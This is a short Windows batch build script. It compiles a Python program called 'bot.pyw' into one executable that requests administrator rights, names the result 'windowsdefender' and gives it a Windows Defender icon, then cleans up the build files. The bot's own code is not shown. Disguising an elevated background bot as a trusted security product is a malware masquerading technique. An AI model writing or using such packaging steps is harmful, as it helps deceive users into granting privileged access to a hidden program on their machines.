@echo off
pyinstaller -F --uac-admin --distpath ./bin -i windows_defender.ico -n windowsdefender bot.pyw
rm -rf ./build *.spec